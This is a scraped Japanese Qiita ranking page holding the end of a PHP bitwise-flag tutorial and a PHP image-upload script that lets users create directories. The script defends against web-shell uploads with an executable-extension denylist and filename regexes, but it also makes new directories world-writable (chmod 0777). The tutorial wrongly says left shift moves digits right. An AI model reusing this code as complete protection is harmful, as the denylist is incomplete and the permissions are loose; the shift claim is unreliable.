<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$a</span> <span class="o">=</span> <span class="mi">0</span><span class="nx">b11</span><span class="p">;</span>            <span class="c1">//  011 (3)</span>
<span class="nv">$b</span> <span class="o">=</span> <span class="mi">0</span><span class="nx">b101</span><span class="p">;</span>           <span class="c1">// ^101 (5)</span>
                      <span class="c1">// --------</span>
<span class="k">echo</span> <span class="nb">decbin</span><span class="p">(</span><span class="nv">$a</span> <span class="o">^</span> <span class="nv">$b</span><span class="p">);</span> <span class="c1">//  110 (6)</span>
</pre></div></div>

<h2>
<span id="否定-" class="fragment"></span><a href="#%E5%90%A6%E5%AE%9A-"><i class="fa fa-link"></i></a>否定 <code>~</code>
</h2>

<ul>
<li>
<code>0</code> ならば <code>1</code>
</li>
<li>
<code>1</code> ならば <code>0</code>
</li>
</ul>

<h3>
<span id="例-mbox3---4" class="fragment"></span><a href="#%E4%BE%8B-mbox3---4"><i class="fa fa-link"></i></a>【例】 $\mbox{~}3 = -4$</h3>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">32ビット環境での例</span></div>
<div class="highlight"><pre><span></span><span class="nv">$a</span> <span class="o">=</span> <span class="mi">0</span><span class="nx">b11</span><span class="p">;</span>            <span class="c1">// ~00000000000000000000000000000011 (3)</span>
                      <span class="c1">// --------------------------------------</span>
<span class="k">echo</span> <span class="nb">decbin</span><span class="p">(</span><span class="o">~</span><span class="nv">$a</span><span class="p">);</span>     <span class="c1">//  11111111111111111111111111111100 (-4)</span>
</pre></div>
</div>

<p>最上位の符号ビットも反転するため <code>-4</code> になりますが、あまり深く悩む必要は無いでしょう。それよりも次に説明するビットフラグの扱いの方が重要です。</p>

<h2>
<span id="左シフト-" class="fragment"></span><a href="#%E5%B7%A6%E3%82%B7%E3%83%95%E3%83%88-"><i class="fa fa-link"></i></a>左シフト <code>&lt;&lt;</code>
</h2>

<ul>
<li>指定した分だけ桁を右にずらす</li>
<li>空いたところには <code>0</code> が埋められる</li>
<li>10進数の<ins>2をかける</ins>演算と同じになる</li>
</ul>

<h3>
<span id="例-3-mbox-1--6" class="fragment"></span><a href="#%E4%BE%8B-3-mbox-1--6"><i class="fa fa-link"></i></a>【例】 $3 \mbox{&lt;&lt;} 1 = 6$</h3>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$a</span> <span class="o">=</span> <span class="mi">0</span><span class="nx">b11</span><span class="p">;</span>            <span class="c1">// &lt;&lt;011 (3)</span>
                      <span class="c1">// --------</span>
<span class="k">echo</span> <span class="nb">decbin</span><span class="p">(</span><span class="nv">$a</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">);</span> <span class="c1">//   110 (6)</span>
</pre></div></div>

<h2>
<span id="右シフト-" class="fragment"></span><a href="#%E5%8F%B3%E3%82%B7%E3%83%95%E3%83%88-"><i class="fa fa-link"></i></a>右シフト <code>&gt;&gt;</code>
</h2>

<ul>
<li>指定した分だけ桁を右にずらす</li>
<li>空いたところには <code>0</code> が埋められる</li>
<li>10進数の<ins>2で割る</ins>演算と同じになる</li>
</ul>

<h3>
<span id="例-3-mbox-1--1" class="fragment"></span><a href="#%E4%BE%8B-3-mbox-1--1"><i class="fa fa-link"></i></a>【例】 $3 \mbox{&gt;&gt;} 1 = 1$</h3>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$a</span> <span class="o">=</span> <span class="mi">0</span><span class="nx">b11</span><span class="p">;</span>            <span class="c1">// &gt;&gt;011 (3)</span>
                      <span class="c1">// --------</span>
<span class="k">echo</span> <span class="nb">decbin</span><span class="p">(</span><span class="nv">$a</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">);</span> <span class="c1">//   001 (1)</span>
</pre></div></div>

<h1>
<span id="なぜビット演算が必要か" class="fragment"></span><a href="#%E3%81%AA%E3%81%9C%E3%83%93%E3%83%83%E3%83%88%E6%BC%94%E7%AE%97%E3%81%8C%E5%BF%85%E8%A6%81%E3%81%8B"><i class="fa fa-link"></i></a>なぜビット演算が必要か？</h1>

<p>「なんでこんな面倒なことしなくちゃいけないの？」って多くの初心者さんが感じていることと思います。ビット演算の一番重要な目的は、 <strong>フラグの受け渡し</strong> です。</p>

<p>例えば、下記のような関数を実装するとします。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">display</span><span class="p">(</span><span class="nv">$disp_a</span><span class="p">,</span> <span class="nv">$disp_b</span><span class="p">,</span> <span class="nv">$disp_c</span><span class="p">,</span> <span class="nv">$disp_d</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$disp_a</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s1">'a'</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$disp_b</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s1">'b'</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$disp_c</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s1">'c'</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$disp_d</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s1">'d'</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div></div>

<p>ここで <code>bc</code> と出力したければ、</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nx">display</span><span class="p">(</span><span class="k">false</span><span class="p">,</span> <span class="k">true</span><span class="p">,</span> <span class="k">true</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
</pre></div></div>

<p>としますが、もしこれが <code>a</code> ～ <code>z</code> まであったらどうでしょうか？面倒くさいってレベルを超えているでしょう。そこでビット演算の出番です。このように書き換えることが出来ます。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">const</span> <span class="no">DISP_A</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// 0b0001</span>
<span class="k">const</span> <span class="no">DISP_B</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span> <span class="c1">// 0b0010</span>
<span class="k">const</span> <span class="no">DISP_C</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span> <span class="c1">// 0b0100</span>
<span class="k">const</span> <span class="no">DISP_D</span> <span class="o">=</span> <span class="mi">8</span><span class="p">;</span> <span class="c1">// 0b1000</span>
<span class="k">function</span> <span class="nf">display</span><span class="p">(</span><span class="nv">$flag</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">DISP_A</span> <span class="o">&amp;</span> <span class="nv">$flag</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s1">'a'</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">DISP_B</span> <span class="o">&amp;</span> <span class="nv">$flag</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s1">'b'</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">DISP_C</span> <span class="o">&amp;</span> <span class="nv">$flag</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s1">'c'</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">DISP_D</span> <span class="o">&amp;</span> <span class="nv">$flag</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s1">'d'</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div></div>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nx">display</span><span class="p">(</span><span class="nx">DISP_B</span> <span class="o">|</span> <span class="nx">DISP_C</span><span class="p">);</span>
</pre></div></div>

<p><code>DISP_A</code> <code>DISP_B</code> <code>DISP_C</code> <code>DISP_D</code> という4つの定数を用意しました。この <code>1</code> <code>2</code> <code>4</code> <code>8</code> という値は、コメントを見てもらえば分かると思いますが、<ins>その番目の桁だけが <code>1</code></ins> となるように構成されています。1つの桁に1種類の情報を格納しよう、というのが狙いです。</p>

<p>順に流れを追っていきます。</p>

<blockquote>
<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nx">display</span><span class="p">(</span><span class="nx">DISP_B</span> <span class="o">|</span> <span class="nx">DISP_C</span><span class="p">);</span>
</pre></div></div>
</blockquote>

<p>これで <code>0b0110</code> がフラグとして渡されます。</p>

<blockquote>
<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nx">DISP_A</span> <span class="o">&amp;</span> <span class="nv">$flag</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s1">'a'</span><span class="p">;</span>
<span class="p">}</span>
</pre></div></div>
</blockquote>

<p>ここは <code>0b0001 &amp; 0b0110</code> の演算が発生し、結果は <code>0b0000</code> 、つまり <code>0</code> になります。<code>0</code> は論理値 <code>FALSE</code> として変換されるので、この <code>echo</code> は実行されません。</p>

<blockquote>
<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nx">DISP_B</span> <span class="o">&amp;</span> <span class="nv">$flag</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s1">'b'</span><span class="p">;</span>
<span class="p">}</span>
</pre></div></div>
</blockquote>

<p>ここは <code>0b0010 &amp; 0b0110</code> の演算が発生し、結果は <code>0b0010</code> 、つまり <code>2</code> になります。<code>2</code> は論理値 <code>TRUE</code> として変換されるので、この <code>echo</code> は実行されます。</p>

<blockquote>
<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nx">DISP_C</span> <span class="o">&amp;</span> <span class="nv">$flag</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s1">'c'</span><span class="p">;</span>
<span class="p">}</span>
</pre></div></div>
</blockquote>

<p>ここは <code>0b0100 &amp; 0b0110</code> の演算が発生し、結果は <code>0b0100</code> 、つまり <code>4</code> になります。<code>4</code> は論理値 <code>TRUE</code> として変換されるので、この <code>echo</code> は実行されます。</p>

<blockquote>
<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nx">DISP_D</span> <span class="o">&amp;</span> <span class="nv">$flag</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s1">'d'</span><span class="p">;</span>
<span class="p">}</span>
</pre></div></div>
</blockquote>

<p>ここは <code>0b1000 &amp; 0b0110</code> の演算が発生し、結果は <code>0b0000</code> 、つまり <code>0</code> になります。<code>0</code> は論理値 <code>FALSE</code> として変換されるので、この <code>echo</code> は実行されません。</p>

<h3>
<span id="ビット演算のメリット" class="fragment"></span><a href="#%E3%83%93%E3%83%83%E3%83%88%E6%BC%94%E7%AE%97%E3%81%AE%E3%83%A1%E3%83%AA%E3%83%83%E3%83%88"><i class="fa fa-link"></i></a>ビット演算のメリット</h3>

<ul>
<li>引数を1つに出来る</li>
<li>必要なものだけの <strong>ビット和</strong> をとって渡せばいいようになる</li>
<li>関数側で1つの値から <strong>ビット積</strong> を使って複数の情報を取り出せる</li>
</ul>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />26位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>49</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/695f443674aef8d349c3">ディレクトリ作成を許可してファイルをアップロード</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2014-02-24 03:32:30</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[正規表現]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="前書き" class="fragment"></span><a href="#%E5%89%8D%E6%9B%B8%E3%81%8D"><i class="fa fa-link"></i></a><strong>前書き</strong>
</h1>

<p>まだ <strong><a href="http://qiita.com/mpyw/items/939964377766a54d4682" id="reference-4775dcf320944416c4bb">「ファイルアップロードの例外処理はこれぐらいしないと気が済まない」</a></strong> をご覧になっていない方は先にそちらからどうぞ。</p>

<p>タイトルの通り、ディレクトリ作成を許可してユーザーにファイルをアップロードさせたいときのためのスクリプトです。今回は以下の条件のもと行ってみます。</p>

<ul>
<li>ファイル名はそのまま使用する</li>
<li>許可するファイル形式を <code>JPEG</code> <code>PNG</code> <code>GIF</code> のみに制限する</li>
<li>ファイル名またはディレクトリ名に使われる文字を正規表現 <code>[\w.-]</code> にマッチするもののみに制限する</li>
<li>スクリプトとして実行可能な <code>*.php</code> <code>*.cgi</code> <code>*.rb</code> <code>*.py</code> にマッチするファイル名のものは禁止する <strong>(トロイの木馬対策)</strong>
</li>
<li>ディレクトリを10階層までに制限する</li>
<li>
<code>.</code> で始まるまたは終わる「ファイル」「2文字以上のディレクトリ」は許可しない <strong>(ディレクトリトラバーサル対策)</strong>
</li>
<li>絶対パスによるディレクトリ指定は許可しない</li>
</ul>

<h1>
<span id="ソースコード" class="fragment"></span><a href="#%E3%82%BD%E3%83%BC%E3%82%B9%E3%82%B3%E3%83%BC%E3%83%89"><i class="fa fa-link"></i></a><strong>ソースコード</strong>
</h1>

<p>コピペで動くと思います。サーバーに他の実行可能な拡張子が存在する場合はそれも禁止対象に追加してください。</p>

<div class="code-frame" data-lang="html+php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="cm">/* HTML特殊文字をエスケープする関数 */</span>
<span class="k">function</span> <span class="nf">h</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// 全てのパラメータを正しい構造で受け取った時のみ実行</span>
<span class="k">if</span> <span class="p">(</span>
    <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'path'</span><span class="p">],</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'error'</span><span class="p">])</span> <span class="o">&amp;&amp;</span>
    <span class="nb">is_int</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'error'</span><span class="p">])</span> <span class="o">&amp;&amp;</span>
    <span class="nb">is_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'path'</span><span class="p">])</span>
<span class="p">)</span> <span class="p">{</span>

    <span class="k">try</span> <span class="p">{</span>

        <span class="cm">/* ファイルのチェック */</span>
        <span class="k">switch</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'error'</span><span class="p">])</span> <span class="p">{</span>
            <span class="k">case</span> <span class="nx">UPLOAD_ERR_OK</span><span class="o">:</span>
                <span class="c1">// エラー無し</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">case</span> <span class="nx">UPLOAD_ERR_NO_FILE</span><span class="o">:</span>
                <span class="c1">// ファイル未選択</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'File is not selected'</span><span class="p">);</span>
            <span class="k">case</span> <span class="nx">UPLOAD_ERR_INI_SIZE</span><span class="o">:</span>
            <span class="k">case</span> <span class="nx">UPLOAD_ERR_FORM_SIZE</span><span class="o">:</span>
                <span class="c1">// 許可サイズを超過</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'File is too large'</span><span class="p">);</span>
            <span class="k">default</span><span class="o">:</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'Unknown error'</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">in_array</span><span class="p">(</span>
            <span class="o">@</span><span class="nb">exif_imagetype</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">]),</span>
            <span class="k">array</span><span class="p">(</span>
                <span class="nx">IMAGETYPE_GIF</span><span class="p">,</span>
                <span class="nx">IMAGETYPE_JPEG</span><span class="p">,</span>
                <span class="nx">IMAGETYPE_PNG</span><span class="p">,</span>
            <span class="p">),</span>
            <span class="k">true</span>
        <span class="p">))</span> <span class="p">{</span>
            <span class="c1">// JPEG, PNG, GIF ではない</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'Unsupported image format'</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/\A(?!\.)[\w.-]++(?&lt;!\.)\z/'</span><span class="p">,</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'name'</span><span class="p">]))</span> <span class="p">{</span>
            <span class="c1">// 無効なファイル名</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'Invalid filename: '</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'name'</span><span class="p">]);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/(?&lt;!\.php)(?&lt;!\.cgi)(?&lt;!\.py)(?&lt;!\.rb)\z/i'</span><span class="p">,</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'name'</span><span class="p">]))</span> <span class="p">{</span>
            <span class="c1">// トロイの木馬を弾くため、実行可能な拡張子は禁止する</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span>
                <span class="s1">'This extension is forbidden for security reason: '</span> <span class="o">.</span>
                <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'name'</span><span class="p">]</span>
            <span class="p">);</span>
        <span class="p">}</span>

        <span class="cm">/* ディレクトリの生成 */</span>
        <span class="nv">$deep</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'path'</span><span class="p">])</span> <span class="k">as</span> <span class="nv">$i</span> <span class="o">=&gt;</span> <span class="nv">$dir</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$deep</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
                <span class="c1">// 10階層を超過</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'Hierarchy is too deep'</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$dir</span> <span class="o">===</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'path'</span><span class="p">]</span> <span class="o">!==</span> <span class="s1">''</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$i</span><span class="p">)</span> <span class="p">{</span>
                    <span class="c1">// 絶対パスを検知</span>
                    <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'Absolute path is not allowed'</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="c1">// 空文字列はスキップ</span>
                <span class="k">continue</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$dir</span> <span class="o">===</span> <span class="s1">'.'</span><span class="p">)</span> <span class="p">{</span>
                <span class="c1">// 「.」はスキップする</span>
                <span class="k">continue</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/\A(?!\.)[\w.-]++(?&lt;!\.)\z/'</span><span class="p">,</span> <span class="nv">$dir</span><span class="p">))</span> <span class="p">{</span>
                <span class="c1">// 無効なディレクトリ名</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'Invalid directory name: '</span> <span class="o">.</span> <span class="nv">$dir</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">))</span> <span class="p">{</span>
                <span class="c1">// ディレクトリが存在していなければ生成を試みる</span>
                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">mkdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">))</span> <span class="p">{</span>
                    <span class="c1">// ディレクトリ生成に失敗</span>
                    <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'Failed to create directory: '</span> <span class="o">.</span> <span class="nv">$dir</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="c1">// パーミッションを0777に設定</span>
                <span class="nb">chmod</span><span class="p">(</span><span class="nv">$dir</span><span class="p">,</span> <span class="mo">0777</span><span class="p">);</span>
                <span class="nv">$msgs</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'blue'</span><span class="p">,</span> <span class="s1">'Created directory "'</span> <span class="o">.</span> <span class="nv">$dir</span> <span class="o">.</span> <span class="s1">'"'</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="c1">// カレントディレクトリを移動</span>
            <span class="nb">chdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
            <span class="o">++</span><span class="nv">$deep</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="cm">/* ファイルの移動 */</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">],</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'name'</span><span class="p">]))</span> <span class="p">{</span>
            <span class="c1">// ファイル移動に失敗</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'Failed to save uploaded file'</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="c1">// ファイルのパーミッションを確実に0644に設定する</span>
        <span class="nb">chmod</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'name'</span><span class="p">],</span> <span class="mo">0644</span><span class="p">);</span>

        <span class="cm">/* メッセージをセット */</span>
        <span class="nv">$msgs</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
            <span class="s1">'green'</span><span class="p">,</span>
            <span class="s1">'Uploaded successfully: '</span> <span class="o">.</span>
                <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'path'</span><span class="p">]</span> <span class="o">===</span> <span class="s1">''</span> <span class="o">?</span> <span class="s1">'.'</span> <span class="o">:</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'path'</span><span class="p">])</span> <span class="o">.</span>
                <span class="s1">'/'</span> <span class="o">.</span>
                <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'name'</span><span class="p">]</span>
        <span class="p">);</span>

    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">RuntimeException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>

        <span class="nv">$msgs</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'red'</span><span class="p">,</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">());</span>

    <span class="p">}</span>

<span class="p">}</span>

<span class="c1">// XHTMLとしてブラウザに認識させる</span>
<span class="c1">// (IE8以下はサポート対象外ｗ)</span>
<span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: application/xhtml+xml; charset=utf-8'</span><span class="p">);</span>

<span class="cp">?&gt;</span>
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span> <span class="na">xmlns</span><span class="o">=</span><span class="s">"http://www.w3.org/1999/xhtml"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Hierarchical Image Uploading<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$msgs</span><span class="p">))</span><span class="o">:</span> <span class="cp">?&gt;</span>
  <span class="p">&lt;</span><span class="nt">fieldset</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">legend</span><span class="p">&gt;</span>Result<span class="p">&lt;/</span><span class="nt">legend</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">ul</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$msgs</span> <span class="k">as</span> <span class="nv">$msg</span><span class="p">)</span><span class="o">:</span> <span class="cp">?&gt;</span> 
      <span class="p">&lt;</span><span class="nt">li</span> <span class="na">style</span><span class="o">=</span><span class="s">"color:</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$msg</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="cp">?&gt;</span><span class="s">;"</span><span class="p">&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$msg</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endforeach</span><span class="p">;</span> <span class="cp">?&gt;</span>
    <span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">fieldset</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endif</span><span class="p">;</span> <span class="cp">?&gt;</span>
  <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"multipart/form-data"</span> <span class="na">method</span><span class="o">=</span><span class="s">"post"</span> <span class="na">action</span><span class="o">=</span><span class="s">""</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">fieldset</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">legend</span><span class="p">&gt;</span>Select file (Directory name and filename must match <span class="p">&lt;</span><span class="nt">strong</span><span class="p">&gt;</span>'/\A(?!\.)[\w.-]++(?<span class="ni">&amp;lt;</span>!\.)\z/'<span class="p">&lt;/</span><span class="nt">strong</span><span class="p">&gt;</span>)<span class="p">&lt;/</span><span class="nt">legend</span><span class="p">&gt;</span>
      Directory path: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">name</span><span class="o">=</span><span class="s">"path"</span> <span class="na">value</span><span class="o">=</span><span class="s">""</span> <span class="p">/&gt;&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
      Filename(GIF, JPEG, PNG): <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"file"</span> <span class="na">name</span><span class="o">=</span><span class="s">"upfile"</span> <span class="p">/&gt;&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"Upload"</span> <span class="p">/&gt;</span>
    <span class="p">&lt;/</span><span class="nt">fieldset</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div></div>
</div>
